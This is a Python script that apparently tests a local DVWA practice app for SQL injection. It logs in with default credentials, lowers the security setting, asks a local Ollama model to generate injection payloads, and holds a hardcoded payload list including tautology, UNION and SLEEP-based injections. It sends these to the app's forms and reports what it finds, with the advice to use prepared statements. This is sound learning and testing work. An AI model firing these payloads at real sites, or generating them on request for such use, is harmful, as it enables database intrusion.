import requests
from bs4 import BeautifulSoup
import json
import time
from urllib.parse import urljoin

BASE_URL = "http://localhost:8080/"
LOGIN_URL = urljoin(BASE_URL, "login.php")

session = requests.Session()

# ---------------- DEFAULT PAYLOADS (IMPORTANT) ----------------
BASE_PAYLOADS = [
    "'",
    "' OR '1'='1",
    "' OR 1=1 --",
    "' OR 'a'='a",
    "admin'--",
    "' UNION SELECT NULL, NULL --",
    "' AND 1=1 --",
    "' AND 1=2 --",
    "' OR SLEEP(3)--"
]

# ---------------- OLLAMA PAYLOADS ----------------
def generate_payloads():

    print("[+] Generating payloads using Ollama (AI only)...")

    prompt = """
Generate ONLY 5 simple SQL injection payloads.
Rules:
- Only payloads
- One per line
- No explanation
- No comments
Example:
' OR '1'='1
"""

    try:
        res = requests.post(
            "http://localhost:11434/api/generate",
            json={
                "model": "qwen3:1.7b",
                "prompt": prompt,
                "stream": False
            }
        )

        data = res.json()

        print("[DEBUG RAW RESPONSE]:\n", data)

        text = data.get("response", "")

        payloads = []

        for line in text.split("\n"):

            line = line.strip()

            # ❌ remove unwanted lines
            if not line:
                continue
            if len(line) < 3:
                continue
            if " " not in line and "'" not in line:
                continue

            # ✅ remove comments
            if "--" in line:
                line = line.split("--")[0].strip()

            payloads.append(line)

        print("[+] Clean AI Payloads:")
        for p in payloads:
            print("   ", p)

        return payloads

    except Exception as e:
        print("[-] Ollama failed:", e)
        return []


# ---------------- LOGIN ----------------
def login():

    login_page = session.get(LOGIN_URL)
    soup = BeautifulSoup(login_page.text, "html.parser")

    token = soup.find("input", {"name": "user_token"})
    token_value = token["value"] if token else None

    login_data = {
        "username": "admin",
        "password": "password",
        "Login": "Login"
    }

    if token_value:
        login_data["user_token"] = token_value

    response = session.post(LOGIN_URL, data=login_data)

    if response.status_code == 200:
        print("[+] Login successful")

        session.cookies.set("security", "low")
        print("[+] Security level set to LOW")

    else:
        print("[-] Login failed")
        exit()



# ---------------- DETECTION ----------------
def is_vulnerable(response_text, response_time):

    text = response_text.lower()

    # SQL errors
    errors = [
        "sql syntax",
        "mysql",
        "syntax error",
        "pdoexception",
        "sqlstate"
    ]

    for e in errors:
        if e in text:
            return True

    # DVWA success page detection
    if "first name" in text and "surname" in text:
        return True

    # Blind SQL (time delay)
    if response_time > 3:
        return True

    return False


# ---------------- LOAD FORMS ----------------
def load_forms():

    with open("output.json", "r") as f:
        return json.load(f)


# ---------------- SCAN ----------------
def scan():

    forms = load_forms()
    payloads = generate_payloads()

    results = []

    print("\n Scan Started\n")

    for form in forms:

        action = urljoin(BASE_URL, form.get("action"))
        method = form.get("method", "get").lower()
        inputs = form.get("inputs", [])

        print("Scanning:", action)

        for payload in payloads:

            data = {}

            for inp in inputs:
             name = inp.get("name")

            if not name:
              continue

    
            if "id" in name.lower():
              data[name] = payload
            else:
              data[name] = "1"

            try:
                start = time.time()

                if method == "post":
                    res = session.post(action, data=data)
                else:
                    res = session.get(action, params=data)

                end = time.time()
                delay = end - start

            except:
                continue

            print("Testing:", payload)

            if is_vulnerable(res.text, delay):

                print("VULNERABLE FOUND!")

                results.append({
                "url": action,
                "method": method,
                "payload": payload,
                "issue": "Possible SQL Injection",
                "fix": "Use prepared statements / parameterized queries"
                })

                break

    with open("vulnerabilities_llm.json", "w") as f:
        json.dump(results, f, indent=4)

    print("\nScan Complete")
    print("Total:", len(results))


# ---------------- MAIN ----------------
if __name__ == "__main__":
    login()
    scan()